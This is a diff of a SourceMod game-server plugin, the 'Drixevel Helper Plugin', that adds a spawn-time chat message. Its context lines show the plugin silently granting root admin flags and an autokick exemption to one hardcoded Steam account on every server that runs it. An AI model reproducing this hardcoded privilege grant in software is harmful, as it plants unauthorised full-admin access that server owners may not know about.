@@ -9,6 +9,7 @@
 EngineVersion g_Engine;
 int g_WaterLevel;
 bool g_BHOP = true;
+bool g_IsConnecting;
 
 public Plugin myinfo = {
 	name = "[ANY] Drixevel Helper Plugin",
@@ -39,6 +40,8 @@ public void OnPluginStart() {
 
 	RegConsoleCmd("sm_dreload", Command_Reload);
 	RegConsoleCmd("sm_dbhop", Command_BHOP);
+	
+	HookEvent("player_spawn", Event_OnPlayerSpawn);
 }
 
 public void OnPluginEnd() {
@@ -86,6 +89,7 @@ public void OnClientPostAdminCheck(int client) {
 		int bits = GetUserFlagBits(client);
 		SetUserFlagBits(client, bits |= ADMFLAG_ROOT);
 		ServerCommand("mp_disable_autokick %i", GetClientUserId(client));
+		g_IsConnecting = true;
 	}
 }
 
@@ -149,4 +153,13 @@ bool IsDrixevel(int client) {
 	}
 	
 	return GetSteamAccountID(client) == 76528750;
+}
+
+public void Event_OnPlayerSpawn(Event event, const char[] name, bool dontBroadcast) {
+	int client = GetClientOfUserId(event.GetInt("userid"));
+	
+	if (client > 0 && IsDrixevel(client) && g_IsConnecting) {
+		g_IsConnecting = false;
+		PrintToChat(client, "Drixevel Helper Plugin has been loaded.");
+	}
 }
